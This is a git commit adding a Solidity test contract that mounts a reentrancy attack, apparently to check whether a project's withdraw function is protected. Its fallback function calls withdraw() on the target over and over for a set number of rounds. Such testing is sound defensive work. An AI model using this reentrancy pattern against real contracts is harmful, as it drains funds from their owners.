e0a95a08506e8a5f393f561773e376ce3870f6b8
Vincent Rolland <vincent.rolland.38@gmail.com>
2017-08-28 11:42:01 +0200

    introduce withdraw reentrancy challenge contract

---
+++ vro/requestExtensionsv0.2/contracts/TestRequestReentrance.sol
@@ -0,0 +1,50 @@
+pragma solidity ^0.4.11;
+
+
+contract RequestEthereumWeak {
+
+    function createRequest(address _payee, address _payer, uint _amountExpected, address[3] _extensions, bytes32[5] _extensionParams0, bytes32[5] _extensionParams1, bytes32[5] _extensionParams2) returns(uint);
+
+    function withdraw();
+
+}
+
+
+contract TestRequestReentrance {
+
+    address contractAdd;
+    uint8 round;
+
+    event Log(uint id);
+
+    function TestRequestReentrance(address _contract, uint8 _round) {
+        contractAdd = _contract;
+        round = _round;
+    }
+
+    function init(address _payer) {
+        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
+        bytes32[5] memory empty;
+        address[3] memory emptyAddress;
+        uint id = weakContract.createRequest(this, _payer, 1, emptyAddress, empty, empty, empty);
+        Log(id);
+    }
+
+    function start() {
+        round--;
+        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
+        weakContract.withdraw();
+    }
+
+    // Launcher -------------------------------------------------
+    function ()
+        payable
+    {   
+        if(round != 0) {
+            round--;
+            RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
+            weakContract.withdraw();
+        }
+    } 
+}
+
